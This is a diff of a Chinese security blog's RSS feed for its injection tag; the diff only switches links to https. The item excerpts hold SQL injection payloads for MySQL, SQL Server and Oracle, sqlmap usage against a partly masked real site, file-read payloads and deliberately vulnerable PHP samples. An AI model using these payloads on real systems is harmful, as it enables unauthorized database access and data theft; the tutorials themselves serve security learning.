@@ -2,31 +2,31 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>injection on </title>
-    <link>http://wyb0.com/tags/injection/</link>
+    <link>https://wyb0.com/tags/injection/</link>
     <description>Recent content in injection on </description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <lastBuildDate>Mon, 22 Jun 2020 17:35:07 +0800</lastBuildDate>
     
-	<atom:link href="http://wyb0.com/tags/injection/index.xml" rel="self" type="application/rss+xml" />
+	<atom:link href="https://wyb0.com/tags/injection/index.xml" rel="self" type="application/rss+xml" />
     
     
     <item>
       <title>记一次 SQL 注入简单 bypass</title>
-      <link>http://wyb0.com/posts/2020/recording-a-injection-bypass/</link>
+      <link>https://wyb0.com/posts/2020/recording-a-injection-bypass/</link>
       <pubDate>Mon, 22 Jun 2020 17:35:07 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2020/recording-a-injection-bypass/</guid>
+      <guid>https://wyb0.com/posts/2020/recording-a-injection-bypass/</guid>
       <description>0x00 存在 SQL 注入 总之是遇到一个站，登录的页面，数据包大致如下：
 POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 Content-Length: 47 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://115.xxx.xxx.xxx:8042 Referer: http://115.xxx.xxx.xxx:8042/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: ASP.NET_SessionId=bxdzehxa5mvoco1fkrjlbqbt Connection: close uname=admin*&amp;amp;pwd=dskfsdkf&amp;amp;valCode=1197&amp;amp;telphone=  其中验证码可以绕过，而登录名那里存在注入 使用 and 1=1、and 1=2 时，发现过滤了空格，用/**/代替 0x01 简单看一下 中间件是 IIS，存在 len 函数，确定为 SQLServer Order by 一下，看看能不能 union，发现有 10 列 尝试 union select admin 转换为 int 时出错，感觉好像能显示位，测试发现确实可以显示 可以获取数据库版本，可以确定有 union 注入了 0x02 sqlmap sqlmap跑一下：sqlmap --risk=3 --level=3 --batch --thread=1 -r 1.</description>
     </item>
     
     <item>
       <title>通过 selenium 和 flask 中转后利用 sqlmap 进行注入</title>
-      <link>http://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link>
+      <link>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</link>
       <pubDate>Sat, 27 Jul 2019 18:15:25 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid>
+      <guid>https://wyb0.com/posts/2019/after-transit-via-selenium-flask-to-use-sqlmap/</guid>
       <description>0x00 先说前提 昨天某个小伙伴说有个注入没法搞 前端提交登陆表单时数据包加密了, 而且有个 sign 字符串每次都不一样用于校验, 应该是用 js 加密了 0x01 找加密的 js 文件 注入的地方是获取验证码时的手机号, 刚开始想着先找到 js 加密的函数, 然后生成 sign 再组数据包发送。
 就像 记一次SQL Server报错注入 中一样, 用 selenium 或者 PhantomJS 执行 js 代码生成sign
 一番查找发现了加密的 js 文件函数, 但是用的是 angular 这个前端框架, 没用过这个东西。。。。。 能看懂一般的 js 代码, 但是这个没得搞, 不懂。。。
@@ -38,10 +38,10 @@ POST /jsweb/userlogin/UserLoginAction.aspx HTTP/1.1 Host: 115.xxx.xxx.xxx:8042 C
     
     <item>
       <title>SQL注入tips(Oracle)</title>
-      <link>http://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
+      <link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link>
       <pubDate>Fri, 04 Jan 2019 20:23:35 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
+      <guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid>
       <description>0x00 判断数据库类型  Oracle有一些自带的表：dual、user_tables
  id=45 and (select count(*) from user_tables)&amp;gt;0-- id=45 and (select count(*) from dual)&amp;gt;0--  利用自带的一些函数：譬如utl_http.request 这些
  利用Oracle的字符连接符：CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(49)||CHR(61)||CHR(49)
@@ -53,10 +53,10 @@ select user from dual; --当前用户 select username from user_users; --当前�
     
     <item>
       <title>记一次SQL Server报错注入</title>
-      <link>http://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
+      <link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link>
       <pubDate>Mon, 24 Dec 2018 10:51:02 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
+      <guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid>
       <description>0x00 验证码前端验证 需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行 那就抓个包吧 emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：
 用户不存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;用户名不存在！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
 用户名存在时返回 {&amp;quot;iserror&amp;quot;:true,&amp;quot;message&amp;quot;:&amp;quot;密码不正确！&amp;quot;,&amp;quot;data&amp;quot;:null,&amp;quot;errorfieldlist&amp;quot;:null}
@@ -74,29 +74,29 @@ py一下了吧，前端有js进行加密，可以本地写文件生成加密后�
     
     <item>
       <title>SQL注入tips(SQL Server)</title>
-      <link>http://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
+      <link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link>
       <pubDate>Tue, 04 Sep 2018 10:09:17 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
+      <guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid>
       <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 UNION query &amp;amp; error-based 注入  判断存在注入  and 1=1/and 1=2  select * from msg where id=1 and 11=(select case when(1=1) then 11 else 2 end); select * from msg where id=1 and 11=(select case when(1=2) then 11 else 2 end);   判断是否为sa权限  select name from msg where id=1 and 1=convert(int,(select is_srvrolemember(&#39;sysadmin&#39;)));   得到所有数据库名字   --得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 id=1 and 0&amp;lt;&amp;gt;(select name from master.</description>
     </item>
     
     <item>
       <title>SQL注入tips(MySQL)</title>
-      <link>http://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
+      <link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link>
       <pubDate>Wed, 23 May 2018 11:14:51 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
+      <guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid>
       <description>环境：MySQL 5.5.47
 0x00 注入点在Order by后面 mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &#39;C:\\Apps\\phpStudy\\WWW\\a.txt&#39;; Query OK, 1 row affected (0.01 sec)  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~msg~&#39;  mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1); ERROR 1105 (HY000): XPATH syntax error: &#39;~rtest~&#39;  mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2)); +----------+ | name | +----------+ | xiaohong | +----------+ 1 row in set (0.</description>
     </item>
     
     <item>
       <title>ThinkPHP5的where函数</title>
-      <link>http://wyb0.com/posts/2018/thinkphp5-where-function/</link>
+      <link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link>
       <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
+      <guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid>
       <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
 0x01 示例代码 tp5/application/home/controller/Index.php
 &amp;lt;?php namespace app\home\controller; use think\Db; class Index { //http://127.0.0.1/Source/tp5/home/index/testdb/id/1 public function testDb() { // 调用 tp5/thinkphp/library/think/Db.php 的 connect() 函数 初始化数据库，并取得数据库类实例 $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 //在Db.php中use think\db\Query; $msg-&amp;gt;where()则调用了Query.php中的where函数进入查询流程 $result = $msg-&amp;gt;where(&amp;quot;id=&amp;quot;.$id)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;hr/&amp;gt;执行的sql语句：&#39;; echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;最终得到的结果：&#39;; echo var_dump($result); } }  where函数接收字符串和数组时，访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1执行的SQL语句分别如下：
@@ -105,10 +105,10 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
     
     <item>
       <title>SSI注入</title>
-      <link>http://wyb0.com/posts/2017/ssi-injection/</link>
+      <link>https://wyb0.com/posts/2017/ssi-injection/</link>
       <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2017/ssi-injection/</guid>
+      <guid>https://wyb0.com/posts/2017/ssi-injection/</guid>
       <description> 0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
 在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
 若注入点在url中则可能需要进行url编码
@@ -117,10 +117,10 @@ SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存
     
     <item>
       <title>[转]MySQL报错注入原理分析(count()、rand()、group by)</title>
-      <link>http://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
+      <link>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</link>
       <pubDate>Sun, 13 Nov 2016 11:59:26 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
+      <guid>https://wyb0.com/posts/2016/mysql-injection-error-based-theory-count-rand-groupby/</guid>
       <description>原文链接：http://drops.wooyun.org/tips/14312
 0x00 疑问 一直在用mysql数据库报错注入方法，但为何会报错？
 百度谷歌知乎了一番，发现大家都是把官网的结论发一下截图，然后执行sql语句证明一下结论，但是没有人去深入研究为什么rand不能和order by一起使用，也没彻底说明三者同时使用报错的原理。
@@ -143,10 +143,10 @@ mysql&amp;gt; select floor(rand()*2) from `T-Safe`; +-----------------+ | floor(
     
     <item>
       <title>SQL注入之防御</title>
-      <link>http://wyb0.com/posts/2016/injection-of-defense/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-defense/</link>
       <pubDate>Sat, 25 Jun 2016 10:25:11 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-defense/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-defense/</guid>
       <description>0x00 要做的事 也就是找到注入点然后修复
 0x01 防御方法  使用预编译语句绑定变量(比如php的mysqli、pdo)
 &amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?&amp;gt;  使用存储过程(这里以SQLServer举例)
@@ -155,20 +155,20 @@ mysql&amp;gt; select floor(rand()*2) from `T-Safe`; +-----------------+ | floor(
     
     <item>
       <title>SQL注入之宽字节注入(MySQL)</title>
-      <link>http://wyb0.com/posts/2016/injection-of-wide-byte/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link>
       <pubDate>Fri, 24 Jun 2016 15:32:34 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
       <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
 0x01 测试代码 &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
     </item>
     
     <item>
       <title>SQL注入之基于时间的注入(MySQL)</title>
-      <link>http://wyb0.com/posts/2016/injection-of-time-based/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-time-based/</link>
       <pubDate>Fri, 24 Jun 2016 10:10:27 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-time-based/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid>
       <description>0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。  0x01 利用方式 整型注入的话可以直接: ?id=if(1=1,sleep(2),1) 字符型的话需要闭合: ?id=2&#39; and if(1=1,sleep(2),1) and &#39;1  0x02 相关函数  if(条件, 值1, 值2)
 当条件为真时返回值1，条件为假时返回值2
  sleep()
@@ -180,10 +180,10 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
     
     <item>
       <title>SQL注入之布尔型注入(MySQL)</title>
-      <link>http://wyb0.com/posts/2016/injection-of-boolian-based/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link>
       <pubDate>Thu, 23 Jun 2016 23:32:34 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
       <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
  得到表名 最终依次猜的表名为users
  得到列名 同理最终得到第2列列名为username，第3列列名为password
@@ -193,10 +193,10 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
     
     <item>
       <title>SQL注入之报错型注入(MySQL)</title>
-      <link>http://wyb0.com/posts/2016/injection-of-error-based/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-error-based/</link>
       <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-error-based/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid>
       <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
 ?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
 ?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
@@ -207,10 +207,10 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
     
     <item>
       <title>SQL注入之联合查询(MySQL)</title>
-      <link>http://wyb0.com/posts/2016/injection-of-union-select/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-union-select/</link>
       <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-union-select/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid>
       <description> 0x00 前提 要用联合查询进行注入则：页面必须有显示位
 0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
 0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位(从数据库中查询出来的数据有些会显示在页面中，显示的位置就是显示位)  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   </description>
@@ -218,10 +218,10 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
     
     <item>
       <title>SQL注入之load_file和into outfile(MySQL)</title>
-      <link>http://wyb0.com/posts/2016/injection-of-mysql-function/</link>
+      <link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link>
       <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
+      <guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
       <description>0x00 load_file() 读文件  条件:  1. 要有file_priv权限: show global variables like &#39;%secure%&#39;; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
  读/etc/init.d下的东西，这里有配置文件路径
 ?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
@@ -231,10 +231,10 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
     
     <item>
       <title>SQL注入</title>
-      <link>http://wyb0.com/posts/2016/injection/</link>
+      <link>https://wyb0.com/posts/2016/injection/</link>
       <pubDate>Sun, 19 Jun 2016 20:18:48 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2016/injection/</guid>
+      <guid>https://wyb0.com/posts/2016/injection/</guid>
       <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
 总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
 0x01 成因 SQl语句未对用户参数进行严格过滤
@@ -257,10 +257,10 @@ benchmark是用于测试函数性能的，它是将表达式expr执行count次�
     
     <item>
       <title>ASP联合注入(Cookie处)</title>
-      <link>http://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
+      <link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
       <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
+      <guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
       <description> 0x00 Cookie注入的使用  三大Web提交方式
  GET：直接在浏览器上面访问地址
  POST：提交表单(会员注册、文件上传等)
